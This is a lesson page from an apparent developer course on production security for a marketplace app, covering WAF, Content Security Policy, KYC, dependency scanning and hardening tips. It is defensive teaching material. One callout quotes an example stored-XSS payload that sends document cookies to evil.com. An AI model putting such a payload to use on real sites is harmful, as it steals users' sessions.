---
title: Security
slug: security
phase: Phase 4
mode: production
projectType: marketplace
estimatedTime: 20-25 min
---

# Security (Hardening the Perimeter)

## Moving From Application Security to Infrastructure Security

In Phase 3, you built Application Security: authorization checks, input validation (Zod), and secure sessions (HttpOnly cookies). 

In Phase 4 (Production Readiness), Application Security is no longer enough. Your marketplace will face automated botnets, credential stuffing attacks, and malicious payloads designed to exploit vulnerabilities in your underlying infrastructure. You must harden the perimeter *before* traffic reaches your application code.

---

## Web Application Firewall (WAF) & DDoS Protection

If you expose your Next.js or Node.js server directly to the public internet, a simple Layer 7 DDoS attack (e.g., 50,000 requests per second to your `/search` endpoint) will exhaust your database connections and take your marketplace offline in minutes.

**The Production Standard:**
You must route all traffic through a WAF and DDoS mitigation service (e.g., **Cloudflare**, **AWS Shield**, or **Vercel Edge**).

* **DDoS Protection:** Automatically absorbs volumetric attacks and blocks known malicious botnets.
* **WAF Rules:** Analyzes incoming HTTP requests and blocks payloads containing SQL Injection (SQLi) or Cross-Site Scripting (XSS) vectors before your Node.js server even sees the request.

---

## Content Security Policy (CSP)

Application-level sanitization (`sanitize-html`) is error-prone. If a developer forgets to sanitize a single field, an attacker can execute malicious JavaScript in a buyer's browser (Stored XSS).

**The Defense in Depth:** Implement a strict Content Security Policy (CSP).
A CSP is an HTTP header that tells the browser exactly which domains are allowed to execute scripts, load images, or open WebSockets.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://js.stripe.com; img-src 'self' https://res.cloudinary.com; connect-src 'self' https://api.sendbird.com;
```

> [!IMPORTANT]
> If a malicious seller successfully injects `<script>fetch('https://evil.com?cookie='+document.cookie)</script>` into their listing description, the browser will block the script from executing because `evil.com` is not in your CSP allowlist.

---

## Identity Verification (KYC / KYB)

If your marketplace facilitates high-value transactions or payouts, you are legally required to perform Know Your Customer (KYC) or Know Your Business (KYB) checks to prevent money laundering and fraud.

You cannot rely on simple email verification.

**The Production Implementation:**
Integrate **Stripe Identity** or **Persona**. 
Before a seller can publish their first listing, they must upload a government-issued ID and take a live selfie. The service cryptographically verifies the document's authenticity and matches the face. This drastically reduces the number of scammers willing to operate on your platform.

---

## Automated Vulnerability Scanning

Your application code might be secure, but if your `package.json` relies on a version of `express` with a known vulnerability (CVE), you are exposed.

**The Production Rule:**
You must integrate continuous security scanning into your CI/CD pipeline.
1. Enable **GitHub Dependabot** to alert you to vulnerable dependencies automatically.
2. Integrate **Snyk** or **Trivy** into your GitHub Actions workflow to block Pull Requests that introduce high-severity vulnerabilities.

---

## Do's and Don'ts of Production Security

- **DO require hardware MFA for Admins.** Your internal Admin Panel is the highest-value target. Passwords are not enough. Require WebAuthn (YubiKey or TouchID) for all internal accounts.
- **DON'T store secrets in `.env` files on production servers.** Use a Secret Manager (AWS Secrets Manager, Vercel Env Variables, Doppler) to inject secrets securely at runtime.
- **DO implement HSTS.** Enforce HTTP Strict Transport Security (`Strict-Transport-Security: max-age=31536000; includeSubDomains`) to ensure browsers refuse to load your site over an unencrypted HTTP connection.
- **DON'T rely on obscure API routes.** Obfuscating an admin route (`/api/secret-admin-panel-99`) is not security. Attackers will find it via automated directory brute-forcing. Protect it with strict IAM authorization.

---

## AI Prompts You Can Use

> [!TIP]
> **Prompt 1 — Generating a Strict CSP:**

````prompt
Act as a Principal Security Engineer. I am deploying a Next.js application that uses Stripe Elements, Algolia InstantSearch, Cloudinary for images, and PostHog for analytics. Write the exact `Content-Security-Policy` header configuration for my `next.config.js`. Ensure it is strictly locked down (no `unsafe-inline` if possible, or explain the nonce strategy required to achieve it).
````

> [!TIP]
> **Prompt 2 — CI/CD Security Workflow:**

````prompt
Write a GitHub Actions workflow YAML file for a Node.js project. It must check out the code, install dependencies, and run a `snyk test` to scan for high-severity vulnerabilities. If a vulnerability is found, the action must fail and block the PR merge. Include instructions on how to securely inject the `SNYK_TOKEN` via GitHub Secrets.
````

---

## Validating What AI Generates

- **Check for `unsafe-inline`:** If the AI generates a CSP that includes `script-src 'unsafe-inline'`, reject it unless it provides a cryptographic nonce architecture. Allowing `unsafe-inline` defeats the primary XSS-prevention benefit of a CSP.
- **Verify KYC compliance:** Ensure that any identity verification flow generated by AI relies on a trusted third party (like Stripe) rather than attempting to securely store and process user ID scans on your own servers (which introduces massive liability).

---

## Implementation Checklist

- [ ] Routed all production traffic through a WAF / CDN (Cloudflare, AWS Shield) for DDoS protection.
- [ ] Configured a strict Content Security Policy (CSP) header to mitigate XSS attacks at the browser level.
- [ ] Integrated Identity Verification (KYC/KYB) for sellers before allowing high-value payouts.
- [ ] Enabled automated dependency scanning (Snyk/Dependabot) in the CI/CD pipeline.
- [ ] Enforced HTTP Strict Transport Security (HSTS) and secure Secret Management.

---

## What's Next

Next: **Performance Optimization** — With the perimeter secured, we must ensure the application runs blazingly fast. We will architect Edge caching, optimize Core Web Vitals for SEO, and configure database connection pooling to handle high concurrency.
